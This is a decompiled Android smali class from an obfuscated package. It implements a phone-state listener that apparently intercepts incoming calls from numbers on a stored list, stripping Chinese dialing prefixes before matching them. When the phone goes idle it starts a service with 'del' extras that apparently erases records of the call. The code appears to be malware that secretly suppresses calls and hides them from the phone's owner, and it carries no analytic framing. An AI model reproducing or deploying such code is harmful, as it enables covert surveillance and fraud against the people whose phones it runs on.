.class final Lcom/kk/liushiwu/com/zz/d;
.super Landroid/telephony/PhoneStateListener;


# instance fields
.field final synthetic a:Lcom/kk/liushiwu/com/zz/pr;


# direct methods
.method constructor <init>(Lcom/kk/liushiwu/com/zz/pr;)V
    .locals 0

    iput-object p1, p0, Lcom/kk/liushiwu/com/zz/d;->a:Lcom/kk/liushiwu/com/zz/pr;

    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V

    return-void
.end method


# virtual methods
.method public final onCallStateChanged(ILjava/lang/String;)V
    .locals 3

    invoke-super {p0, p1, p2}, Landroid/telephony/PhoneStateListener;->onCallStateChanged(ILjava/lang/String;)V

    packed-switch p1, :pswitch_data_0

    :cond_0
    :goto_0
    :pswitch_0
    return-void

    :pswitch_1
    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/kk/liushiwu/com/zz/d;->a:Lcom/kk/liushiwu/com/zz/pr;

    iget-object v1, v1, Lcom/kk/liushiwu/com/zz/pr;->a:Landroid/content/Context;

    const-class v2, Lcom/kk/liushiwu/com/zz/br;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "delmobile"

    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "auto"

    const-string v2, "del"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v1, p0, Lcom/kk/liushiwu/com/zz/d;->a:Lcom/kk/liushiwu/com/zz/pr;

    iget-object v1, v1, Lcom/kk/liushiwu/com/zz/pr;->a:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :pswitch_2
    const-string v0, "\\+86"

    const-string v1, ""

    invoke-virtual {p2, v0, v1}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "12593"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "17911"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/kk/liushiwu/com/zz/d;->a:Lcom/kk/liushiwu/com/zz/pr;

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/pr;->a(Lcom/kk/liushiwu/com/zz/pr;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v1, p0, Lcom/kk/liushiwu/com/zz/d;->a:Lcom/kk/liushiwu/com/zz/pr;

    invoke-virtual {v1, v0}, Lcom/kk/liushiwu/com/zz/pr;->a(Ljava/lang/String;)V

    goto :goto_0

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_2
        :pswitch_0
    .end packed-switch
.end method
